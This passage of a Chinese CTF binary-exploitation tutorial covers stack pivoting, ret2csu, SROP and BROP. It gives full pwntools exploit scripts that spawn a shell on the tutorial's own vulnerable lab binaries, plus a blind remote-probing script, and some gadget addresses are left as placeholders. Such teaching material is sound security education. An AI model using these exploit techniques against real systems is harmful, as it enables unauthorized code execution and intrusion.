    read(0, blob, 0x400);    // 输入点①：长数据写进 bss
    read(0, buf, 0x20);      // 输入点②：溢出仅 0x10+8+8 = 0x20，盖 rbp+ret
    return 0;
}
```

**checksec**：

```bash
$ checksec t2
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ROPgadget --binary t2 | grep -E "leave|pop rsi|pop rdi"   # 没有 pop rdx！
0x000000000040117b : leave ; ret
0x0000000000401183 : pop rsi ; pop r15 ; ret
0x0000000000401183? ...                              # pop rdi 也能找到
$ readelf -s t2 | grep csu                           # 有 __libc_csu_init
```

**思路**：

```text
① 溢出 0x20 只够放 fake_rbp + leave;ret → 栈迁移（7.2.3）：链搬去 bss
② 链A（blob）：pop_rdi+puts(puts_got) 泄露 libc
   → 用 csu 调 read(0, CHAIN_B, 0x100)（没有 pop rdx，7.1 补位）
   → ret 到 CHAIN_B
③ 第二笔溢出：p64(CHAIN_A - 8) + p64(leave_ret)，注意 64 位链首 = fake_rbp+8
④ 第二次输入：链B = ret(对齐) + pop_rdi(binsh) + system
```

**完整 exp**：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p    = process('./t2')
elf  = ELF('./t2')
libc = ELF('./libc.so.6')

# gadget 自查（本题关键：无 pop rdx → read 用 csu 调）
leave_ret = 0x40117B    # leave ; ret
pop_rdi   = 0x401183    # pop rdi ; ret（示例值，自查）
csu_pop   = 0x4011??    # 同例题 1 的定位方法
csu_call  = 0x4011??

CHAIN_A = elf.bss() + 0x100     # 链A 落点（第一笔输入 = blob）
CHAIN_B = elf.bss() + 0x300     # 链B 落点（csu read 的目标，与链A 区隔）
FAKE_RBP= CHAIN_A - 8           # ★ 64 位：链首 = fake_rbp + 8

puts_got  = elf.got['puts']
read_got  = elf.got['read']
puts_plt  = elf.plt['puts']

def csu_call_read(rdx, rsi, edi=0):
    """csu 两段调用 read(edi, rsi, rdx)，结束后 ret 到指定处"""
    rop  = p64(csu_pop)
    rop += p64(0)          # rbx=0：call [read_got] = read
    rop += p64(1)          # rbp=1：调一轮即出循环
    rop += p64(read_got)   # r12
    rop += p64(rdx)        # r13 → rdx
    rop += p64(rsi)        # r14 → rsi
    rop += p64(edi)        # r15 → edi
    rop += p64(csu_call)
    return rop

# ---- 第一笔：链A 写进 blob（bss）----
chain_a  = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)   # puts(puts_got) 泄露
chain_a += csu_call_read(0x100, CHAIN_B)                  # read(0, CHAIN_B, 0x100)
chain_a += p64(0) * 7                                     # csu 收尾 7 槽
chain_a += p64(CHAIN_B)                                   # ret → 链B
p.send(chain_a.ljust(0x400, b'\x00'))

# ---- 第二笔：8+8 字节溢出，触发迁移 ----
p.send(b'A' * 0x10 + p64(FAKE_RBP) + p64(leave_ret))

# ---- 收泄露 ----
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
success(f'libc base = {hex(libc.address)}')

# ---- 第三笔：链B（已知 libc 后构造）----
binsh = next(libc.search(b'/bin/sh\x00'))
chain_b  = p64(0x40101A)                                  # ret：垫 movaps 对齐
chain_b += p64(pop_rdi) + p64(binsh)
chain_b += p64(libc.sym['system'])
p.send(chain_b.ljust(0x100, b'\x00'))                     # 对应 csu 的 read

p.interactive()
```

**栈图（迁移瞬间）**：

```text
第二笔输入后，main 尾部 leave;ret：
  leave: rsp = rbp_main → pop rbp: rbp = FAKE_RBP，rsp → ret 槽
  ret:   rip = leave_ret，rsp → ret 槽+8
进入 leave_ret gadget：
  leave: rsp = rbp = FAKE_RBP = CHAIN_A - 8
         pop rbp: rsp = CHAIN_A
  ret:   rip = [CHAIN_A] = 链A 第一条（pop_rdi）★ 无缝衔接
```

**变体**：
- 溢出更短（只有 8 字节盖 rbp+ret 里的 ret）→ 用 `pop ebp ; ret` + `leave ; ret` 二段式（7.2.4）；
- blob 没有现成读入点 → 迁移目标换成"本次输入的尾部"（若溢出能多写几个槽）或配合 csu 先 read 到 bss 再迁移；
- 迁移到堆：把 CHAIN_A 换成可控堆块地址（先 leak 堆地址）。

### 例题 3：SROP getshell（无 leak、单输入的 64 位程序）

**伪 C**：

```c
// t3.c —— gcc -fno-stack-protector -no-pie -static t3.c -o t3（静态方便找 syscall）
#include <unistd.h>

int main() {
    char buf[0x10];
    read(0, buf, 0x300);     // 仅一次输入，溢出 0x10+8 之后还有约 0x120 字节可用
    return 0;
}
```

**checksec**：

```bash
$ checksec t3
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ROPgadget --binary t3 | grep -E ": pop rax ; ret$|syscall ; ret$"
0x0000000000401802 : pop rax ; ret
0x0000000000401804 : syscall ; ret
```

**思路**：

```text
没有第二输入点、没有输出函数 → "/bin/sh" 无法预先放 bss，栈地址也无从知晓。
解法：两次 SROP 接力（frame.rsp 的用武之地，7.10.3）：
  SROP①：伪造 frame 设 rax=0(read)、rdi=0、rsi=BSS、rdx=0x300、rip=syscall_ret、
          rsp=BSS 触发链位置 → 等价于"再读 0x300 字节到 bss 并从那里继续 ROP"
  第二笔输入：触发链(pop rax;15;syscall) + frame②(/bin/sh 已随数据写入 bss) + "/bin/sh"
  SROP②：execve("/bin/sh", 0, 0) → shell
全程零 leak，也无需任何传参 gadget。
```

**完整 exp**：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p   = process('./t3')
elf = ELF('./t3')

pop_rax_ret = 0x401802     # pop rax ; ret
syscall_ret = 0x401804     # syscall ; ret
offset      = 0x10 + 8     # buf + saved rbp
BSS         = elf.bss() + 0x200          # 第二次 read 的目标区
TRIGGER     = BSS + 0x10                 # 第二轮触发链在 BSS 中的位置（自定布局）

# ============ 第一笔：SROP① 让内核替我们调 read ============
frame1 = SigreturnFrame(kernel='amd64')
frame1.rax = constants.SYS_read      # 0
frame1.rdi = 0                       # stdin
frame1.rsi = BSS                     # buf
frame1.rdx = 0x300                   # len
frame1.rip = syscall_ret             # read 由 syscall 发起
frame1.rsp = TRIGGER                 # ★ read 返回（ret）后，栈从 TRIGGER 继续

rop1  = b'A' * offset
rop1 += p64(pop_rax_ret) + p64(15)   # rax = 15 (rt_sigreturn)
rop1 += p64(syscall_ret)             # 触发 SROP①
rop1 += bytes(frame1)                # 伪造 sigcontext（紧跟触发器，内核按 rsp 读）
p.send(rop1)

# ============ 第二笔：往 BSS 读入触发链 + frame② + "/bin/sh" ============
frame2 = SigreturnFrame(kernel='amd64')
frame2.rax = constants.SYS_execve    # 59
frame2.rdi = BSS + 0x300             # "/bin/sh" 的落点（见下方布局）
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret
frame2.rsp = 0xdead0000              # execve 成功后旧栈作废，随意

second  = b'A' * 0x10                            # 占位，TRIGGER= BSS+0x10
second += p64(pop_rax_ret) + p64(15) + p64(syscall_ret)   # 触发链
second += bytes(frame2)
second += b'/bin/sh\x00'                         # 落在 BSS+0x300 附近，与 rdi 对齐
assert second.find(b'/bin/sh') + BSS == frame2.rdi   # 自检 rdi 指向正确
p.send(second.ljust(0x300, b'\x00'))

p.interactive()                      # execve("/bin/sh",0,0)
```

执行流程图：

```text
第一笔：ret → pop rax(15) → syscall → 内核按 frame1 恢复：
        rax=0/rdi=0/rsi=BSS/rdx=0x300/rip=syscall_ret/rsp=TRIGGER
        → syscall 即 read(0, BSS, 0x300)，阻塞等待第二笔
第二笔到达 → read 返回 → ret 从 rsp=TRIGGER 取地址 → pop rax(15) → syscall
        → 内核按 frame2 恢复 → execve("/bin/sh",0,0) → shell
```

**变体**：
- 有第二输入点（像 7.3.4 的双 read 题）→ 一步 SROP 即可，省去接力；
- rax 凑 15 的巧法：`read(0, buf, 0x18)` 只发 **15 字节**，read 返回值恰为 15（rax），返回地址直接 `syscall ; ret`；
- 沙箱禁 execve → frame 改打 orw 三连（frame.rsp 链式接力），见 7.3.6 与 [11-ORW与沙箱绕过.md](11-ORW与沙箱绕过.md)。

### 例题 4：BROP 思路演示（本地模拟盲打）

**靶子**（模拟"没有附件的远程服务"，攻击脚本**不读它的文件、只用 socket 行为**）：

```c
// brop_target.c —— gcc -fno-stack-protector -no-pie brop_target.c -o brop_target
#include <unistd.h>
#include <string.h>

int main() {
    char buf[0x40];
    read(0, buf, 0x200);              // 溢出点
    return 0;                          // 崩溃 → 进程退出（模拟远程断连）
}
```

```bash
# 模拟远程：socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./brop_target
$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./brop_target &
```

**判据**（BROP 适用性）：进程由 socat fork 拉起、崩了自动重启 → 满足 7.5.1 全部前提。

**攻击脚本**（只允许通过连接行为区分 crash/hang/exit，禁止读文件）：

```python
from pwn import *
import string

context(arch='amd64', os='linux', log_level='info')
IP, PORT = '127.0.0.1', 9999
CODE_SEG_START = 0x400000          # 非 PIE 代码段基址（BROP 常识假设）

def trial(payload, timeout=0.5):
    """发送 payload，返回 'hang' / 'exit' / 'crash'"""
    try:
        p = remote(IP, PORT, timeout=2)
    except Exception:
        return 'crash'
    p.send(payload)
    try:
        p.recv(timeout=timeout)     # 有数据回 → 有输出行为
        p.shutdown('send')
        try:
            p.recv(timeout=timeout)
            status = 'hang'         # 迟迟不 EOF → 挂住
        except EOFError:
            status = 'exit'
    except EOFError:
        status = 'exit'             # 优雅退出
    except Exception:
        status = 'crash'
    p.close()
    return status

# ---------- ① 探测溢出偏移：返回地址被半覆盖（低字节变 0x00? 用自增差分） ----------
def find_offset():
    for i in range(1, 0x100):
        payload = b'A' * i + b'B' * 8        # 先粗探：整 8 字节覆盖 ret 后必崩
        if trial(payload) == 'crash':
            # 细化：逐字节确认覆盖到 ret 的第 1 字节
            payload = b'A' * (i - 1) + b'\x01'   # 改 ret 最低 1 字节 → 大概率崩
            if trial(payload) == 'crash':
                return i - 1                 # ret 槽起点
    return None

OFFSET = find_offset()
log.success(f'offset = {OFFSET}')

# ---------- ②③ 扫描 stop gadget 与 brop gadget ----------
def find_stop_gadget():
    """找"挂住"的地址：程序不崩也不退（阻塞 read 之类）"""
    for addr in range(CODE_SEG_START + 0x400, CODE_SEG_START + 0x1000, 0x10):
        st = trial(b'A' * OFFSET + p64(addr))
        if st == 'hang':
            return addr
    return None

STOP = find_stop_gadget()
log.success(f'stop gadget = {hex(STOP)}')

def is_brop_gadget(addr):
    """候选 + 16B 垃圾 + stop gadget：6 连 pop 会吃满垃圾后 ret 到 stop → hang"""
    payload = b'A' * OFFSET + p64(addr) + b'B' * 0x10 + p64(STOP)
    return trial(payload) == 'hang'

def find_brop_gadget():
    for addr in range(CODE_SEG_START + 0x400, CODE_SEG_START + 0x1000, 0x8):
        if is_brop_gadget(addr):
            # 差分复核：垃圾加长到 0x18，普通 gadget 行为会变，6 pop 仍稳定 hang
            payload = b'A' * OFFSET + p64(addr) + b'B' * 0x18 + p64(STOP)
            if trial(payload) == 'hang':
                return addr
    return None

BROP_G = find_brop_gadget()
log.success(f'brop gadget = {hex(BROP_G)}')

# ---------- ④ 推导传参 gadget ----------
pop_rsi_r15 = BROP_G + 7        # 字节重叠：5e 41 5f c3 → pop rsi ; pop r15 ; ret
pop_rdi     = BROP_G - 2        # csu 区常见：5f c3 → pop rdi ; ret（需验证）

# ---------- ⑤⑥⑦ 找 puts@plt 并 leak libc ----------
def find_puts_plt(got_addr_guess):
    """调用候选 PLT：若回传了可读数据 → 是输出函数"""
    for cand in range(0x400540, 0x400700, 0x10):
        payload = (b'A' * OFFSET + p64(pop_rdi) + p64(got_addr_guess)
                   + p64(cand) + p64(STOP))
        try:
            p = remote(IP, PORT, timeout=2)
            p.send(payload)
            data = p.recv(timeout=1)
            p.close()
            if data and all(c in string.printable.encode() + b'\x80\x7f\xff'
                            for c in data[:16]):
                return cand, data
        except Exception:
            continue
    return None, None

# puts@got 的典型位置（非 PIE：.got.plt 在 0x601000 段）；逐项试到有输出为止
for got in range(0x601018, 0x601040, 8):
    puts_plt, data = find_puts_plt(got)
    if puts_plt:
        break
log.success(f'puts@plt = {hex(puts_plt)}, leak = {data}')

# 拿到泄露的 libc 指针 → LibcSearcher/libc-database 定位版本（05 章方法）
# 最后一击：
#   payload = 'A'*OFFSET + p64(pop_rdi) + p64(binsh) + p64(system)
# 与普通 ret2libc 相同，此处从略。
```

**演示要点**：

- `trial()` 的三分（hang/exit/crash）是 BROP 的**眼睛**，一切信息都从"断连行为差分"来；
- 扫描范围与步长（8/16 字节）决定耗时，实战中先用大步长找疑似、再细化；
- 靶子越"沉默"（无输出）BROP 越依赖 stop gadget；靶子有任何输出函数都会大幅提速；
- 真实远程还要处理网络抖动误判：关键结论（如 brop gadget）都要差分复核 2~3 次。

**变体**：dump 整个代码段重建二进制（7.5.6）；64 位之外 32 位 BROP 同理（pop 4 字节、差分阈值变化）。

---

## 7.10 常见坑

**7.10.1 csu gadget2 的 call 是 `[r12+rbx*8]`，r12 必须指向"可读且存着函数指针"的内存**

- 填 r12 = 函数地址本身是错的（会把该地址内存里的 8 字节当指针去 call，多半 SIGSEGV）；正确姿势是 r12 = 某个 **GOT 表项地址**（GOT 里存的就是 libc 函数真实地址）。
- rbx 不是 0 时（连调指针表），确保 `r12 + rbx*8` 整个表区可读且每项都是合法指针。
- 自查：`call [r12+rbx*8]` 前在 gdb `x/gx $r12 + $rbx*8`，看值是否是预期函数地址。

**7.10.2 leave;ret 之后 ebp 被重复利用**

- `leave = mov esp,ebp ; pop ebp`：**新链执行期间 ebp 已经变成了 `[fake_ebp]` 的值**。如果你的链里后续 gadget 依赖 ebp（`pop ebp; ret`、`leave` 再来一次、某些 `mov [ebp-X]` 类指令），要清楚它当前是迁移前的旧值还是 fake_ebp 指到的值。
- 链上再次使用 `leave ; ret`（接力迁移）时，务必重新安排 ebp：要么在链里放 `pop ebp ; ret` 重设，要么让 `[fake_ebp]` 处正好是下一个 fake_ebp。
- 调试时在 gdb 里 `si` 逐步跟 `leave`，别凭感觉。

**7.10.3 SROP frame 里的 rsp 别乱设**

- `frame.rsp` 是 rt_sigreturn **恢复之后的栈指针**：getshell（execve）场景随便设都行，但 **orw/链式 SROP 场景它是"下一幕的舞台"**——read/open/write 的 syscall 返回后 `ret` 就从 frame.rsp 取地址，设错直接崩或跳飞。
- frame 必须放在**触发 syscall 的那一刻 rsp 能指到的地方**：通常紧跟 `pop rax;15;syscall_ret` 之后；迁移场景里触发器和 frame 都要一起搬到新区。
- frame 长达 248 字节，别让它跨过 read 的边界（发送长度不够 → frame 尾部是旧数据，rip 恢复成垃圾）。

**7.10.4 迁移后 esp 与链错位（32 位 +4 / 64 位 +8）**

- 推导见 7.2.3：`leave;ret` 迁移后第一条 gadget 取自 `[fake_ebp + 4]`（32 位）/ `[fake_rbp + 8]`（64 位）。直接把链首写在 fake_ebp 处 → 执行的是链的**第二条**当第一条，全链错位一个槽。
- 两种等价写法任选其一并统一：① `fake_ebp = 链首 - 4/-8`，链连续摆；② 链首就是 fake_ebp，但链开头空一个槽。
- 一句话：**写完迁移 payload，务必用栈图把两次 leave 各自的 rsp 走一遍**。

**7.10.5 csu 两种形态参数填反（rdx 取自 r13 还是 r15）**

- Ubuntu 16.04（形态 A）：`mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d`；Ubuntu 18.04（形态 B）：`mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d`。抄 writeup 不对照反汇编 = 参数错位。
- 每个题都先 `objdump -d` 确认，再决定 r13/r14/r15 填什么。

**7.10.6 csu 的 edi 只有 32 位**

- `mov edi, r15d` 清零高 32 位 → csu 调不了 libc 高地址函数（system/execve），只能调 PLT/GOT 区域（非 PIE 0x4xxxxx）。第二轮 getshell 老老实实用 `pop rdi`（或 leak 后从 libc 找）。

**7.10.7 SROP 的 rax 来源与 context.arch**

- 忘记 `context.arch='amd64'` 就 new `SigreturnFrame` → 32 位布局，一打就崩。
- 32 位调用号 119、用 `int 0x80`；64 位 15、用 `syscall`。
- 用"read 返回值凑 15"时，后续发送字节数**必须恰好 15**，多发一个换行 rax 就不是 15。

**7.10.8 setcontext 的基址寄存器与版本**

- glibc 2.29 分界：之前 rdi（setcontext+53），之后 rdx（setcontext+61）。混淆则"一切看似正确却崩溃"。
- +61 需要 rdx 指向伪 ucontext：没有 `pop rdx` 时记得 csu 的 `mov rdx,r13/r15` 或堆题 rdx 残留。
- ucontext 偏移（+0xa0/+0xa8）与 SROP sigcontext **不是一套**，pwntools SigreturnFrame 不能直接当 ucontext 用。

**7.10.9 movaps 对齐（回顾 7.6）**

- 远程崩、本地不崩，或 system 入口即崩 → 先垫 `ret` 再说；one_gadget 三条全失败也先查对齐（约束里常隐含 rsp 要求）。

**7.10.10 BROP 的误判**

- stop gadget 扫描会把"正常 exit 的代码"误判（recv 到 EOF 的时间抖动）；关键 gadget 一律差分复核多次。
- puts 截断 `\0` 导致 dump 断片：按地址逐字节、空则记 `\0`，别整段抄。

---

## 7.11 本章检查清单

- [ ] 能默写 ret2csu 两段 gadget 的指令形态与栈布局（gadget1 6 连 pop、gadget2 的 7 槽收尾）
- [ ] 知道 csu 两种形态（rdx=r13 vs rdx=r15）并会用 objdump 现场确认
- [ ] 说得清 csu 三大限制：edi 32 位、call [r12+rbx*8] 需可读指针、收尾吃 7 槽
- [ ] 会用 csu 完成"调用任意 GOT 函数 + 任意 3 参数"并写出泄露 libc 的完整 exp
- [ ] 理解 ROP 本质 = 控制 rsp 走位，能不看书推导 leave;ret 迁移后第一条 gadget 的位置（+4/+8）
- [ ] 掌握迁移六法：leave;ret、pop ebp+leave;ret、add rsp,N、xchg eax,esp、setcontext、ebp 低字节半迁移
- [ ] 写出过"迁移到 bss 无限 ROP"完整 exp（32 位与 64 位各一），并处理好 read 目标与旧链的区隔
- [ ] 能画 SROP 信号流程图，说明内核从用户栈恢复寄存器这一"漏洞窗口"
- [ ] 用 SigreturnFrame 写过 SROP getshell，且解释过 frame.rsp 在链式 SROP 中的作用
- [ ] 找得到 ret2reg 跳板（call rax / jmp rdx）并说出"寄存器恰好指向可控数据"的常见场景
- [ ] 能口述 BROP 五步：探偏移 → stop gadget → brop gadget 差分 → 传参 gadget/dump → leak libc
- [ ] 遇到 movaps SIGSEGV 能 1 分钟内确诊并垫 ret 修复
- [ ] 会用 fake_ucontext + setcontext+53/61（知道 2.29 版本分界 rdi→rdx）
- [ ] 能看 7.8 策略表对号入座：缺 rdx/缺 syscall/长度不够/无 csu 时立刻有方案
- [ ] 对照第 7.10 节自查过全部 10 类坑

## 相关阅读

- [04-ret2syscall.md](04-ret2syscall.md) —— 纯 ROP 链式思维与 gadget 搜索基本功，本章所有技巧的地基
- [05-ret2libc.md](05-ret2libc.md) —— leak libc 两段式、one_gadget 与栈对齐初识；本章 csu/SROP 例题的第二轮都回归它
- [06-ret2plt与ret2dlresolve.md](06-ret2plt与ret2dlresolve.md) —— read@plt 写内存（栈迁移的搭档）、无 leak 时的 ret2dlresolve 兜底
- [11-ORW与沙箱绕过.md](11-ORW与沙箱绕过.md) —— SROP 链打 orw、setcontext 布置 orw 的完整展开
- [09-整数溢出与Off-by-One.md](09-整数溢出与Off-by-One.md) —— off-by-one 触发"ebp 低字节半迁移"的漏洞源头
- [10-堆漏洞全解.md](10-堆漏洞全解.md) —— 堆迁移目标与 __free_hook + setcontext 组合拳
- 返回总览：[README.md](README.md)
